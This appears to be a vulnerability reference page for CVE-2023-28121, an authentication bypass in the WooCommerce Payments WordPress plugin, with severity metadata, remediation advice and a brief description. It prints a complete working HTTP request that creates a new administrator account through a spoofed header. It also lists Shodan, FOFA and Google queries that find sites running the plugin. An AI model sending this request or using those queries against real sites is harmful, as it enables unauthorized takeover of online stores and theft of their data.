---
layout: "post"
cve_id: "CVE-2023-28121"
title: "WooCommerce Payments - Unauthorized Admin Access"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-28121.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-28121.yaml"
author: "DhiyaneshDK"
severity: "critical"
impact: "An attacker can gain unauthorized access to the WooCommerce Payments admin panel, potentially leading to data theft or modification.
"
remediation: "Update to the latest version of the WooCommerce Payments plugin to fix the vulnerability.
"
reference:
  - "https://github.com/gbrsh/CVE-2023-28121"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-28121"
  - "https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/"
  - "https://woocommerce.com/products/woocommerce-payments/"
  - "https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-28121', 'cwe-id': 'CWE-287', 'epss-score': 0.93348, 'epss-percentile': 0.99799, 'cpe': 'cpe:2.3:a:automattic:woocommerce_payments:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'automattic', 'product': 'woocommerce_payments', 'framework': 'wordpress', 'shodan-query': 'http.html:/wp-content/plugins/woocommerce-payments', 'fofa-query': 'body=/wp-content/plugins/woocommerce-payments', 'publicwww-query': '/wp-content/plugins/woocommerce-payments', 'google-query': 'inurl:/wp-content/plugins/woocommerce-payments'}"
tags:
  - "cve2023"
  - "cve"
  - "wordpress"
  - "wp"
  - "wp-plugin"
  - "auth-bypass"
  - "intrusive"
  - "automattic"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
An issue in WooCommerce Payments plugin for WordPress (versions 5.6.1 and lower) allows an unauthenticated attacker to send requests on behalf of an elevated user, like administrator. This allows a remote, unauthenticated attacker to gain admin access on a site that has the affected version of the plugin activated.


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Safari/537.36
Connection: close
Content-Length: 106
Content-Type: application/x-www-form-urlencoded
X-WCPAY-PLATFORM-CHECKOUT-USER: 1
Accept-Encoding: gzip

rest_route=%2Fwp%2Fv2%2Fusers&username=LrTZar&email=LmxqSc@KNBCw.com&password=3erm41Tf&roles=administrator
```

